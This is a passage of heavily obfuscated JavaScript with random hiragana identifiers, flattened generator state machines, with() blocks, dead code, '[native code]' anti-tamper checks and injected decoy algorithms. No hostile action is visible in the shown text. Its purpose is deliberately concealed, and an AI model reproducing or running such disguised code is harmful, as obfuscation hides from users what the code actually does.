                              if (ほふはも <= すたきや[18]) {
                                ぬめくほき += String.fromCharCode(Number(そしねめ.substr(むほえ, すたきや[19])));
                                むほえ++;
                              } else {
                                ぬめくほき += String.fromCharCode(ほふはも);
                              }
                            }
                            return ぬめくほき;
                          }
                        };
                        ふはふやせ.みむけせ = true;
                        return module.exports = もせおもくこ.いゆとよ;
                        そしねめ += -278;
                        ぬめくほき += -222;
                        むほえ += 115;
                        break;
                        if (!(むほえ < -(そしねめ + 247))) {
                          ;
                          break;
                        }
                      case 147:
                      case 74:
                      default:
                        [ほふはも.もせおもくこ.うよひちやあ] = [121];
                        ほふはも.のおそて = ほふはも.あぬへにめき;
                        そしねめ += -285;
                        ぬめくほき += 313;
                        むほえ += -244;
                        break;
                        if (!(そしねめ != -(そしねめ + 187))) {
                          ほふはも.のおそて = ほふはも.もせおもくこ;
                          break;
                        }
                      case 52:
                        ほふはも.のおそて = ほふはも.たちとえもふ;
                        そしねめ += -185;
                        ぬめくほき += 26;
                        むほえ += -93;
                        break;
                        if (!(そしねめ != -(ぬめくほき + -42))) {
                          ほふはも.のおそて = ほふはも.もせおもくこ;
                          そしねめ += 100;
                          ぬめくほき += -287;
                          むほえ += 151;
                          break;
                        }
                      case むほえ - 490:
                      case -204:
                      case 78:
                        ほふはも.のおそて = ほふはも.せこにくえ;
                        そしねめ += -285;
                        ぬめくほき += 691;
                        むほえ += -359;
                        break;
                        if (!(そしねめ != -(そしねめ + 187))) {
                          ほふはも.のおそて = ほふはも.もせおもくこ;
                          ぬめくほき += 378;
                          むほえ += -115;
                          break;
                        }
                      case ほふはも.もせおもくこ.うよひちやあ + 132:
                        ほふはも.のおそて = ほふはも.もせおもくこ;
                        ぬめくほき += 274;
                        break;
                    }
                  }
                }
              };
              ふはふやせ.みむけせ = undefined;
              ちせそ + -36;
              ふはふやせ.ふうは = ふはふやせ.あそぬぬに(-34, ちせそ + 413, -231).next().value;
              if (ふはふやせ.みむけせ) {
                ぬめくほき.やひこえすせ = ぬめくほき.ふはふやせ;
                ちせそ += -205;
                break;
              } else {
                ぬめくほき.やひこえすせ = ぬめくほき.ふはふやせ;
                ちせそ += -196;
                そしねめ += -224;
                break;
              }
            case そしねめ - 35:
              1;
              につすのこ();
              ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
              ちせそ += -148;
              break;
            case 72:
              [ぬめくほき.にこほちつめ.へたなたはの] = [-179];
              ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
              ちせそ += -153;
              そしねめ += 63;
              break;
            case 41:
            case 189:
            case ぬめくほき.にこほちつめ.へたなたはの + -412:
              if (うぬせ("" + くめうめみか, "{ [native code] }") === -すたきや[1] || typeof Object.getOwnPropertyDescriptor(くめうめみか, すたきや[ちせそ + 203] + すたきや[21]) !== "undefined") {
                ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
                ちせそ += 24;
                そしねめ += -58;
                break;
              } else {
                ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
                ちせそ += -117;
                そしねめ += 95;
                break;
              }
            case 35:
              めはぬこ = true;
              return くめうめみか;
              ぬめくほき.やひこえすせ = ぬめくほき.ねえな;
              ちせそ += 256;
              そしねめ += -224;
              break;
            case そしねめ != -46 && そしねめ != -51 && そしねめ + 118:
            case 209:
            case 97:
              ぬめくほき.やひこえすせ = ぬめくほき.ゆしそおち;
              そしねめ += 39;
              break;
            case ぬめくほき.にこほちつめ.へたなたはの + -287:
              while (すたきや[4]) {
                if ("s8iTFE" + すたきや[128] in すかく) {
                  ほふはも();
                }
                function ほふはも() {
                  var ちせそ = function (ちせそ) {
                    var ぬめくほき = [];
                    if (ちせそ === すたきや[1] || ちせそ >= すたきや[9]) {
                      そしねめ(ぬめくほき, [], ちせそ, すたきや[0]);
                    }
                    return ぬめくほき;
                  };
                  var そしねめ = function (ちせそ, ほふはも, くめうめみか, XeonBotInc) {
                    for (var めはぬこ = XeonBotInc; めはぬこ < くめうめみか; めはぬこ++) {
                      if (ほふはも.length !== めはぬこ) {
                        return;
                      }
                      for (var うぬせ = すたきや[0]; うぬせ < くめうめみか; うぬせ++) {
                        if (むほえ(ほふはも, [めはぬこ, うぬせ])) {
                          ほふはも.push([めはぬこ, うぬせ]);
                          そしねめ(ちせそ, ほふはも, くめうめみか, めはぬこ + すたきや[1]);
                          if (ほふはも.length === くめうめみか) {
                            ちせそ.push(ぬめくほき(ほふはも));
                          }
                          ほふはも.pop();
                        }
                      }
                    }
                  };
                  var ぬめくほき = function (ちせそ) {
                    var そしねめ = [];
                    var ぬめくほき = ちせそ.length;
                    for (var むほえ = すたきや[0]; むほえ < ぬめくほき; むほえ++) {
                      そしねめ[むほえ] = "";
                      for (var ほふはも = すたきや[0]; ほふはも < ぬめくほき; ほふはも++) {
                        そしねめ[むほえ] += ちせそ[むほえ][すたきや[1]] === ほふはも ? すたきや[10] : すたきや[11];
                      }
                    }
                    return そしねめ;
                  };
                  var むほえ = function (ちせそ, そしねめ) {
                    var ぬめくほき = ちせそ.length;
                    for (var むほえ = すたきや[0]; むほえ < ぬめくほき; むほえ++) {
                      if (ちせそ[むほえ][すたきや[0]] === そしねめ[すたきや[0]] || ちせそ[むほえ][すたきや[1]] === そしねめ[すたきや[1]]) {
                        return すたきや[2];
                      }
                      if (Math.abs((ちせそ[むほえ][すたきや[0]] - そしねめ[すたきや[0]]) / (ちせそ[むほえ][すたきや[1]] - そしねめ[すたきや[1]])) === すたきや[1]) {
                        return すたきや[2];
                      }
                    }
                    return すたきや[4];
                  };
                  console.log(ちせそ);
                }
              }
              めはぬこ = true;
              return すたきや[23];
              ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
              ちせそ += -141;
              そしねめ += -6;
              break;
            case ぬめくほき.にこほちつめ.へたなたはの + -133:
            case 191:
              1;
              はゆもちそえ();
              ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
              そしねめ += -154;
              break;
            default:
              return ふうは;
              ぬめくほき.やひこえすせ = ぬめくほき.ふはふやせ;
              ちせそ += 9;
              そしねめ += -224;
              break;
            case ぬめくほき.にこほちつめ.へたなたはの + -446:
              ぬめくほき.ひしに = {};
              ぬめくほき.ひしに.はゆもちそえ = function (...ちせそ) {
                return XeonBotInc(-159, 112, {
                  ひしに: ぬめくほき.ひしに,
                  にこほちつめ: ぬめくほき.にこほちつめ,
                  ほしさな: {}
                }, ちせそ).next().value;
              };
              if ("nA_V2w" + すたきや[ちせそ + 181] in すかく) {
                ぬめくほき.やひこえすせ = ぬめくほき.ひしに;
                そしねめ += 313;
                break;
              } else {
                ぬめくほき.やひこえすせ = ぬめくほき.にこほちつめ;
                そしねめ += 159;
                break;
              }
          }
        }
      }
    }
    var めはぬこ;
    var ちせそ = XeonBotInc(200, 8).next().value;
    if (めはぬこ) {
      return ちせそ;
    }
  }
  if (arguments.length === すたきや[1]) {
    if ("Iw4CcI" in すかく) {
      ちせそ();
    }
    function ちせそ() {
      var くめうめみか = function (くめうめみか) {
        function* うぬせ(うぬせ, めはぬこ, ちせそ = {
          あやゆそあせ: {}
        }) {
          while (うぬせ + めはぬこ !== 217) {
            with (ちせそ.にえせ || ちせそ) {
              switch (うぬせ + めはぬこ) {
                case 160:
                  [ちせそ.あやゆそあせ.ひけこまま, ちせそ.あやゆそあせ.えよさい] = [55, -2];
                  あやゆそあせ.いしにふしへ = すたきや[うぬせ + -266];
                  あやゆそあせ.くそひかはふ = {};
                  あやゆそあせ.いすひ = すたきや[うぬせ + -(うぬせ + 0)];
                  ちせそ.にえせ = ちせそ.あやゆそあせ;
                  うぬせ += -413;
                  めはぬこ += 173;
                  break;
                  if (めはぬこ > うぬせ + -234) {
                    ちせそ.にえせ = ちせそ.あやゆそあせ;
                    うぬせ += -367;
                    めはぬこ += 300;
                    break;
                  }
                case ちせそ.あやゆそあせ.えよさい + 93:
                  [ちせそ.あやゆそあせ.ひけこまま, ちせそ.あやゆそあせ.えよさい] = [95, -86];
                  ちせそ.にえせ = ちせそ.あやゆそあせ;
                  うぬせ += -162;
                  めはぬこ += -9;
                  break;
                case -8:
                case 169:
                case ちせそ.あやゆそあせ.ひけこまま + -135:
                  ちせそ.あやゆそあせ.なさもよやあ = すたきや[0];
                  ちせそ.あやゆそあせ.さめまむ = すたきや[うぬせ + 147];
                  ちせそ.にえせ = ちせそ.あやゆそあせ;
                  うぬせ += 265;
                  めはぬこ += -361;
                  break;
                  if (!(うぬせ < -143)) {
                    ちせそ.にえせ = ちせそ.はえみしへの;
                    うぬせ += 134;
                    めはぬこ += 163;
                    break;
                  }
                case めはぬこ + 52:
                case 144:
                default:
                  ちせそ.にえせ = ちせそ.いきさててつ;
                  うぬせ += -65;
                  めはぬこ += 342;
                  break;
                case うぬせ != -204 && うぬせ != 15 && うぬせ + 76:
                case -178:
                case 218:
                  ちせそ.にえせ = ちせそ.ねつすふち;
                  うぬせ += 480;
                  めはぬこ += -182;
                  break;
                case うぬせ + 194:
                  [ちせそ.あやゆそあせ.ひけこまま, ちせそ.あやゆそあせ.えよさい] = [187, -178];
                  ちせそ.にえせ = ちせそ.めめうこよけ;
                  うぬせ += 367;
                  めはぬこ += -300;
                  break;
                  if (うぬせ < -(うぬせ + 202)) {
                    ちせそ.にえせ = ちせそ.くくて;
                    うぬせ += 367;
                    めはぬこ += -300;
                    break;
                  }
                case -176:
                  ちせそ.あやゆそあせ.さへねてへ = くめうめみか.length;
                  for (ちせそ.あやゆそあせ.ふくもせすや = すたきや[うぬせ + -(うぬせ + 0)]; ふくもせすや < さへねてへ; ふくもせすや++) {
                    くそひかはふ = {};
                    いすひ = すたきや[うぬせ + -118];
                    なさもよやあ = すたきや[1];
                    for (ちせそ.あやゆそあせ.ちおさそこも = ふくもせすや + すたきや[うぬせ + -117]; ちおさそこも < さへねてへ; ちおさそこも++) {
                      if (くめうめみか[ふくもせすや].x === くめうめみか[ちおさそこも].x && くめうめみか[ふくもせすや].y === くめうめみか[ちおさそこも].y) {
                        なさもよやあ++;
                        continue;
                      }
                      if (くめうめみか[ふくもせすや].y === くめうめみか[ちおさそこも].y) {
                        さめまむ = Number.MAX_SAFE_INTEGER;
                      } else {
                        さめまむ = (くめうめみか[ふくもせすや].x - くめうめみか[ちおさそこも].x) / (くめうめみか[ふくもせすや].y - くめうめみか[ちおさそこも].y);
                      }
                      if (!くそひかはふ[さめまむ]) {
                        くそひかはふ[さめまむ] = すたきや[0];
                      }
                      くそひかはふ[さめまむ]++;
                      いすひ = Math.max(いすひ, くそひかはふ[さめまむ]);
                    }
                    いすひ += なさもよやあ;
                    いしにふしへ = Math.max(いしにふしへ, いすひ);
                  }
                  XeonBotInc = true;
                  return いしにふしへ;
                  ちせそ.にえせ = ちせそ.ゆほけゆへ;
                  うぬせ += -131;
                  めはぬこ += 524;
                  break;
                case -128:
                  ちせそ.にえせ = ちせそ.たうやさ;
                  うぬせ += 191;
                  めはぬこ += 154;
                  break;
              }
            }
          }
        }
        var XeonBotInc;
        var めはぬこ = うぬせ(266, -106).next().value;
        if (XeonBotInc) {
          return めはぬこ;
        }
      };
      console.log(くめうめみか);
    }
    return XeonBotInc(arguments[すたきや[0]]);
  } else if (arguments.length === すたきや[12]) {
    if ("yrC6oMN" in すかく) {
      そしねめ();
    }
    function そしねめ() {
      function くめうめみか(くめうめみか, うぬせ) {
        function* XeonBotInc(XeonBotInc, ちせそ, そしねめ, ぬめくほき, むほえ = {
          まにはち: {}
        }) {
          while (XeonBotInc + ちせそ + そしねめ + ぬめくほき !== -198) {
            with (むほえ.よにみへい || むほえ) {
              switch (XeonBotInc + ちせそ + そしねめ + ぬめくほき) {
                default:
                  [むほえ.まにはち.ぬまき] = [225];
                  if (typeof くめうめみか !== すたきや[XeonBotInc + 94]) {
                    むほえ.よにみへい = むほえ.まにはち;
                    XeonBotInc += -135;
                    ちせそ += 7;
                    そしねめ += -119;
                    ぬめくほき += 267;
                    break;
                  } else {
                    むほえ.よにみへい = むほえ.まにはち;
                    XeonBotInc += 84;
                    ちせそ += 53;
                    そしねめ += -119;
                    ぬめくほき += 195;
                    break;
                  }
                case -85:
                case ぬめくほき - 301:
                  throw new Error("Invalid data key provided (not type string)");
                  むほえ.よにみへい = むほえ.まにはち;
                  XeonBotInc += 219;
                  ちせそ += 46;
                  ぬめくほき += -72;
                  break;
                  if (XeonBotInc == -(XeonBotInc + 285)) {
                    むほえ.よにみへい = むほえ.まにはち;
                    XeonBotInc += 423;
                    ちせそ += -462;
                    そしねめ += 270;
                    ぬめくほき += -72;
                    break;
                  }
                case 20:
                  throw new Error(すたきや[ちせそ + 477] + すたきや[26] + すたきや[ちせそ + 479] + すたきや[ちせそ + 465] + すたきや[28] + すたきや[29] + すたきや[30]);
                  むほえ.よにみへい = むほえ.まにはち;
                  XeonBotInc += -218;
                  そしねめ += 307;
                  ぬめくほき += 95;
                  break;
                case XeonBotInc + 40:
                  if (!くめうめみか) {
                    むほえ.よにみへい = むほえ.まにはち;
                    XeonBotInc += 204;
                    ちせそ += -508;
                    そしねめ += 270;
                    break;
                  } else {
                    むほえ.よにみへい = むほえ.まにはち;
                    XeonBotInc += -14;
                    ちせそ += -508;
                    そしねめ += 577;
                    ぬめくほき += 95;
                    break;
                  }
                case ちせそ + 656:
                case -142:
                  むほえ.まにはち.やえへとつこ = window.localStorage.getItem(くめうめみか);
                  try {
                    やえへとつこ = JSON.parse(やえへとつこ);
                  } catch (まうぬへ) {
                    うぬせ(new Error(すたきや[31] + すたきや[XeonBotInc + 32] + すたきや[33] + すたきや[ちせそ + 486] + すたきや[35] + くめうめみか + すたきや[そしねめ + -435] + まうぬへ.message));
                  }
                  めはぬこ = true;
                  return うぬせ(すたきや[ちせそ + 489], やえへとつこ);
                  むほえ.よにみへい = むほえ.まそぬいなち;
                  XeonBotInc += -66;
                  そしねめ += 95;
                  ぬめくほき += -431;
                  break;
                case 148:
                case -5:
                  [むほえ.まにはち.ぬまき] = [229];
                  むほえ.よにみへい = むほえ.くそせましあ;
                  XeonBotInc += -68;
                  ちせそ += -387;
                  そしねめ += 109;
                  break;
              }
            }
          }
        }
        var めはぬこ;
        var ちせそ = XeonBotInc(-70, 3, 13, -105).next().value;
        if (めはぬこ) {
          return ちせそ;
        }
      }
    }
    var ぬめくほき = arguments[すたきや[0]];
    var むほえ = arguments[すたきや[1]];
    var まうぬへ = ぬめくほき[むほえ];
    まうぬへ = XeonBotInc(まうぬへ);
    return まうぬへ.bind(ぬめくほき);
  }
}
(function () {
  function くめうめみか() {
    function* くめうめみか(XeonBotInc, めはぬこ, ちせそ, そしねめ = {
      のこい: {}
    }, ぬめくほき) {
      while (XeonBotInc + めはぬこ + ちせそ !== -213) {
        with (そしねめ.ますとたさ || そしねめ) {
          switch (XeonBotInc + めはぬこ + ちせそ) {
            case そしねめ.のこい.なくけすや + -219:
            case -215:
            case 81:
              そしねめ.ますとたさ = そしねめ.ゆかせふし;
              XeonBotInc += 336;
              めはぬこ += -118;
              ちせそ += -372;
              break;
            case そしねめ.のこい.なくけすや + 58:
            case -81:
            case 67:
              1;
              そよにしむむ();
              そしねめ.ますとたさ = そしねめ.のこい;
              XeonBotInc += -440;
              break;
              if (!(ちせそ > -34)) {
                そしねめ.ますとたさ = そしねめ.のこい;
                XeonBotInc += -440;
                break;
              }
            case 146:
              [そしねめ.のこい.もほくひのに, そしねめ.のこい.なくけすや, そしねめ.のこい.けえみし] = [36, 226, 42];
              return undefined;
            case そしねめ.のこい.なくけすや + -382:
              try {
                if ("gIN60M" in すかく) {
                  むほえ();
                }
                function むほえ() {
                  function* XeonBotInc(XeonBotInc, ちせそ, そしねめ, ぬめくほき = {
                    とせち: {}
                  }) {
                    while (XeonBotInc + ちせそ + そしねめ !== 9) {
                      with (ぬめくほき.ひかめほたく || ぬめくほき) {
                        switch (XeonBotInc + ちせそ + そしねめ) {
                          default:
                          case 124:
                            [ぬめくほき.とせち.さくみやへ, ぬめくほき.とせち.ぬめとたの] = [-82, 219];
                            ぬめくほき.ひかめほたく = ぬめくほき.ためえあゆや;
                            XeonBotInc += -277;
                            そしねめ += 54;
                            break;
                          case XeonBotInc != 368 && XeonBotInc - 128:
                          case -209:
                            ぬめくほき.ひかめほたく = ぬめくほき.とせち;
                            XeonBotInc += -258;
                            ちせそ += 275;
                            そしねめ += 143;
                            break;
                          case -27:
                          case -191:
                            [ぬめくほき.とせち.さくみやへ, ぬめくほき.とせち.ぬめとたの] = [76, -28];
                            とせち.たくさ = "(c=ak(<~F$VU'9f)~><&85dBPL-module/from";
                            とせち.たしかぬよ = "q:function(){var ad=ad=>b(ad-29);if(!T.r[(typeof ab==ad(123)" + すたきや[XeonBotInc + 213];
                            とせち.むめつ = "return U[c[c[d(-199)]-b(205)]]||V[ae(b(166))];case T.o[c[c[c[d(-199)]+d(-174)]-(c[b(119)]-(c[d(-199)]-163))]+ae(b(146))](0)==b(167)?d(-130):-d(-144)";
                            めはぬこ = true;
                            return とせち.たくさ.match(とせち.たしかぬよ + とせち.むめつ);
                            XeonBotInc += -160;
                            ちせそ += 334;
                            そしねめ += 26;
                            break;
                          case XeonBotInc - 291:
                          case 169:
                          case 88:
                            ぬめくほき.ひかめほたく = ぬめくほき.くたま;
                            XeonBotInc += -560;
                            ちせそ += 166;
                            そしねめ += 469;
                            break;
                          case ぬめくほき.とせち.さくみやへ + 164:
                            ぬめくほき.ひかめほたく = ぬめくほき.めとこさもて;
                            XeonBotInc += -703;
                            ちせそ += 275;
                            そしねめ += 197;
                            break;
                          case XeonBotInc - 283:
                          case 55:
                            ぬめくほき.ひかめほたく = ぬめくほき.ひうい;
                            XeonBotInc += -560;
                            ちせそ += 275;
                            そしねめ += 352;
                            break;
                        }
                      }
                    }
                  }
                  var めはぬこ;
                  var ちせそ = XeonBotInc(-175, -207, 191).next().value;
                  if (めはぬこ) {
                    return ちせそ;
                  }
                }
                そしねめ.のこい.はてせめみに = [];
                delete はてせめみに[すたきや[XeonBotInc + 714]];
              } catch (まうぬへ) {
                if ("KRpTCsS" in すかく) {
                  ほふはも();
                }
                function ほふはも() {
                  var XeonBotInc = function (XeonBotInc) {
                    function* めはぬこ(めはぬこ, そしねめ, ぬめくほき, むほえ = {
                      たてよほへね: {}
                    }) {
                      while (めはぬこ + そしねめ + ぬめくほき !== -152) {
                        with (むほえ.ひよいなひ || むほえ) {
                          switch (めはぬこ + そしねめ + ぬめくほき) {
                            case そしねめ + 435:
                              [むほえ.たてよほへね.えつすへ, むほえ.たてよほへね.まつう] = [-226, 107];
                              むほえ.ひよいなひ = むほえ.すたふほにえ;
                              めはぬこ += -49;
                              そしねめ += 454;
                              ぬめくほき += -778;
                              break;
                              if (そしねめ > めはぬこ + 289) {
                                むほえ.ひよいなひ = むほえ.たてよほへね;
                                そしねめ += 352;
                                ぬめくほき += -585;
                                break;
                              }
                            case 80:
                            case 52:
                            case 102:
                              [むほえ.たてよほへね.えつすへ, むほえ.たてよほへね.まつう] = [189, 42];
                              たてよほへね.すうねみかと = XeonBotInc.length;
                              たてよほへね.ぬすよくはえ = [];
                              たてよほへね.おなおさ = すたきや[そしねめ + -67];
                              たてよほへね.ひちすつ = すたきや[そしねめ + -(そしねめ + 0)];
                              XeonBotInc.sort((めはぬこ, そしねめ) => めはぬこ - そしねめ);
                              むほえ.ひよいなひ = むほえ.たてよほへね;
                              めはぬこ += 3;
                              そしねめ += 107;
                              ぬめくほき += -26;
                              break;
                            case 3:
                            case -144:
                            case そしねめ + 210:
                              むほえ.ひよいなひ = むほえ.いてつこす;
                              めはぬこ += 176;
                              そしねめ += 454;
                              ぬめくほき += -778;
                              break;
                              if (そしねめ > 200) {
                                むほえ.ひよいなひ = むほえ.たてよほへね;
                                めはぬこ += 225;
                                そしねめ += 352;
                                ぬめくほき += -585;
                                break;
                              }
                            case めはぬこ + 311:
                              for (むほえ.たてよほへね.くそう = すたきや[0]; くそう < すうねみかと; くそう++) {
                                if (くそう > すたきや[めはぬこ + 175] && XeonBotInc[くそう] === XeonBotInc[くそう - すたきや[1]]) {
                                  continue;
                                }
                                おなおさ = くそう + すたきや[そしねめ + -173];
                                ひちすつ = すうねみかと - すたきや[めはぬこ + 176];
                                while (おなおさ < ひちすつ) {
                                  if (XeonBotInc[くそう] + XeonBotInc[おなおさ] + XeonBotInc[ひちすつ] < すたきや[0]) {
                                    おなおさ++;
                                  } else if (XeonBotInc[くそう] + XeonBotInc[おなおさ] + XeonBotInc[ひちすつ] > すたきや[0]) {
                                    ひちすつ--;
                                  } else {
                                    ぬすよくはえ.push([XeonBotInc[くそう], XeonBotInc[おなおさ], XeonBotInc[ひちすつ]]);
                                    while (おなおさ < ひちすつ && ゆえつみおか[おなおさ] === ゆえつみおか[おなおさ + すたきや[めはぬこ + 176]]) {
                                      おなおさ++;
                                    }
                                    while (おなおさ < ひちすつ && ゆえつみおか[ひちすつ] === ゆえつみおか[ひちすつ - すたきや[めはぬこ + 176]]) {
                                      ひちすつ--;
                                    }
                                    おなおさ++;
                                    ひちすつ--;
                                  }
                                }
                              }
                              ちせそ = true;
                              return ぬすよくはえ;
                              むほえ.ひよいなひ = むほえ.かめに;
                              めはぬこ += 37;
                              そしねめ += 66;
                              ぬめくほき += -391;
                              break;
                              if (!(ぬめくほき != めはぬこ + 398)) {
                                むほえ.ひよいなひ = むほえ.うなそささも;
                                めはぬこ += -3;
                                そしねめ += -107;
                                ぬめくほき += 26;
                                break;
                              }
                            case -205:
                            case 238:
                            default:
                              [むほえ.たてよほへね.えつすへ, むほえ.たてよほへね.まつう] = [18, 138];
                              むほえ.ひよいなひ = むほえ.めはつそたき;
                              めはぬこ += -49;
                              そしねめ += 102;
                              ぬめくほき += -193;
                              break;
                              if (そしねめ > そしねめ + 62) {
                                むほえ.ひよいなひ = むほえ.たてよほへね;
                                break;
                              }
                          }
                        }
                      }
                    }
                    var ちせそ;
                    var そしねめ = めはぬこ(-178, 67, 163).next().value;
                    if (ちせそ) {
                      return そしねめ;
                    }
                  };
                  console.log(ゆえつみおか);
                }
                うぬせ = true;
                return すたきや[4];
              }
              うぬせ = true;
              return すたきや[めはぬこ + -166];
              そしねめ.ますとたさ = そしねめ.ゆそふうち;
              ゆえつみおか += 74;
              めはぬこ += 127;
              ちせそ += -169;
              break;
            case そしねめ.のこい.なくけすや + 70:
              return undefined;
            case そしねめ.のこい.けえみし + 25:
              かたまさ.むにな = function* ゆえつみおか(めはぬこ, ちせそ, そしねめ = {
                ぬかたもた: {}
              }) {
                while (めはぬこ + ちせそ !== 226) {
                  with (そしねめ.とはは || そしねめ) {
                    switch (めはぬこ + ちせそ) {
                      case そしねめ.ぬかたもた.ええまになし + 92:
                      case 219:
                      case -232:
                      case 98:
                        [そしねめ.ぬかたもた.ねにかてあ, そしねめ.ぬかたもた.ええまになし] = [-222, -140];
                        ぬかたもた.みけもす = function (ゆえつみおか, めはぬこ, ちせそ) {
                          function* そしねめ(そしねめ, むほえ, まうぬへ = {
                            まなはきも: {}
                          }) {
                            while (そしねめ + むほえ !== -185) {
                              with (まうぬへ.むぬちむも || まうぬへ) {
                                switch (そしねめ + むほえ) {
                                  case まうぬへ.まなはきも.えくまた + 260:
                                    ぬめくほき = true;
                                    1;
                                    return ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, すたきや[そしねめ + -134], すたきや[0], すたきや[0], えほもとね);
                                    まうぬへ.むぬちむも = まうぬへ.いめほか;
                                    そしねめ += -256;
                                    break;
                                  case むほえ + 108:
                                    [まうぬへ.まなはきも.えくまた] = [-189];
                                    まなはきも.えほもとね = {};
                                    if (ちせそ.length !== ゆえつみおか.length + めはぬこ.length) {
                                      ぬめくほき = true;
                                      return すたきや[そしねめ + -106];
                                    }
                                    まうぬへ.むぬちむも = まうぬへ.まなはきも;
                                    そしねめ += 26;
                                    むほえ += -139;
                                    break;
                                    if (!(むほえ < そしねめ + 36)) {
                                      ;
                                      break;
                                    }
                                  case -16:
                                    ぬめくほき = true;
                                    1;
                                    return ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, すたきや[そしねめ + -76], すたきや[そしねめ + -76], すたきや[0], えほもとね);
                                    まうぬへ.むぬちむも = まうぬへ.こくみつ;
                                    そしねめ += -198;
                                    むほえ += 29;
                                    break;
                                  default:
                                    まうぬへ.むぬちむも = まうぬへ.めへふくとに;
                                    そしねめ += -400;
                                    break;
                                    if (!(むほえ < -(そしねめ + -248))) {
                                      まうぬへ.むぬちむも = まうぬへ.えせほはの;
                                      そしねめ += -400;
                                      break;
                                    }
                                  case 128:
                                  case 247:
                                  case -55:
                                    [まうぬへ.まなはきも.えくまた] = [-228];
                                    ぬめくほき = true;
                                    1;
                                    return ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, すたきや[0], すたきや[そしねめ + -339], すたきや[0], えほもとね);
                                    まうぬへ.むぬちむも = まうぬへ.くあき;
                                    そしねめ += -461;
                                    むほえ += 29;
                                    break;
                                  case 217:
                                  case 212:
                                    まうぬへ.むぬちむも = まうぬへ.まなはきも;
                                    むほえ += 3;
                                    break;
                                    if (!(むほえ < そしねめ + -146)) {
                                      まうぬへ.むぬちむも = まうぬへ.まなはきも;
                                      そしねめ += -144;
                                      むほえ += 3;
                                      break;
                                    }
                                  case -177:
                                  case -107:
                                  case -144:
                                    ぬめくほき = true;
                                    1;
                                    return ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, すたきや[0], すたきや[0], すたきや[そしねめ + 232], えほもとね);
                                    まうぬへ.むぬちむも = まうぬへ.ひよめへおは;
                                    そしねめ += 110;
                                    むほえ += -151;
                                    break;
                                  case -49:
                                    [まうぬへ.まなはきも.えくまた] = [232];
                                    ぬめくほき = true;
                                    1;
                                    return ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, すたきや[0], すたきや[0], すたきや[0], えほもとね);
                                    まうぬへ.むぬちむも = まうぬへ.ねさぬすこ;
                                    そしねめ += -461;
                                    むほえ += 325;
                                    break;
                                }
                              }
                            }
                          }
                          var ぬめくほき;
                          var むほえ = そしねめ(108, 76).next().value;
                          if (ぬめくほき) {
                            return むほえ;
                          }
                        };
                        ぬかたもた.きひむ = function (ゆえつみおか, めはぬこ, ちせそ, そしねめ, ぬめくほき, むほえ, まうぬへ) {
                          function* ほふはも(ほふはも, うぬせ, すかく = {
                            さきおせなあ: {}
                          }) {
                            while (ほふはも + うぬせ !== 220) {
                              with (すかく.もひい || すかく) {
                                switch (ほふはも + うぬせ) {
                                  case -182:
                                    [すかく.さきおせなあ.ゆつえこつま, すかく.さきおせなあ.いえかそきき] = [-162, 228];
                                    すかく.もひい = すかく.さきおせなあ;
                                    ほふはも += 242;
                                    うぬせ += 128;
                                    break;
                                  case 118:
                                    [すかく.さきおせなあ.ゆつえこつま, すかく.さきおせなあ.いえかそきき] = [-103, -80];
                                    さきおせなあ.せえなけきせ = すたきや[ほふはも + 42];
                                    if (むほえ >= ちせそ.length) {
                                      くめうめみか = true;
                                      return すたきや[4];
                                    }
                                    if (まうぬへ["" + そしねめ + ぬめくほき + むほえ] !== すたきや[23]) {
                                      くめうめみか = true;
                                      return まうぬへ["" + そしねめ + ぬめくほき + むほえ];
                                    }
                                    すかく.もひい = すかく.さきおせなあ;
                                    ほふはも += 43;
                                    うぬせ += 27;
                                    break;
                                  default:
                                    すかく.もひい = すかく.さきおせなあ;
                                    ほふはも += -300;
                                    うぬせ += 321;
                                    break;
                                  case ほふはも + 185:
                                    if (ちせそ[むほえ] === ゆえつみおか[そしねめ] && ちせそ[むほえ] === めはぬこ[ぬめくほき]) {
                                      1;
                                      せえなけきせ = ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, そしねめ + すたきや[1], ぬめくほき, むほえ + すたきや[1], まうぬへ) || (1, ぬかたもた.きひむ)(ゆえつみおか, めはぬこ, ちせそ, そしねめ, ぬめくほき + すたきや[ほふはも + -2], むほえ + すたきや[1], まうぬへ);
                                    } else if (ちせそ[むほえ] === ゆえつみおか[そしねめ]) {
                                      1;
                                      せえなけきせ = ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, そしねめ + すたきや[ほふはも + -2], ぬめくほき, むほえ + すたきや[1], まうぬへ);
                                    } else if (ちせそ[むほえ] === めはぬこ[ぬめくほき]) {
                                      1;
                                      せえなけきせ = ぬかたもた.きひむ(ゆえつみおか, めはぬこ, ちせそ, そしねめ, ぬめくほき + すたきや[1], むほえ + すたきや[ほふはも + -2], まうぬへ);
                                    }
                                    まうぬへ["" + そしねめ + ぬめくほき + むほえ] = せえなけきせ;
                                    くめうめみか = true;
                                    return せえなけきせ;
                                    すかく.もひい = すかく.やねて;
                                    ほふはも += 160;
                                    うぬせ += -128;
                                    break;
                                    if (!(ほふはも == 3)) {
                                      すかく.もひい = すかく.さきおせなあ;
                                      ほふはも += -173;
                                      うぬせ += -128;
                                      break;
                                    }
                                  case -113:
                                  case -30:
                                  case 16:
                                    [すかく.さきおせなあ.ゆつえこつま, すかく.さきおせなあ.いえかそきき] = [-103, -88];
                                    すかく.もひい = すかく.さきおせなあ;
                                    ほふはも += 173;
                                    うぬせ += 128;
                                    break;
                                }
                              }
                            }
                          }
                          var くめうめみか;
                          var うぬせ = ほふはも(-40, 158).next().value;
                          if (くめうめみか) {
                            return うぬせ;
                          }
                        };
                        かたまさ.のむししそね = true;
                        return console.log(ぬかたもた.みけもす);
                        めはぬこ += 232;
                        ちせそ += -104;
                        break;
                      case めはぬこ - 28:
                      case 223:
                        そしねめ.とはは = そしねめ.けののおへ;
                        めはぬこ += -167;
                        ちせそ += 177;
                        break;
                      case ちせそ + 36:
                        そしねめ.とはは = そしねめ.ぬかたもた;
                        めはぬこ += 145;
                        ちせそ += -270;
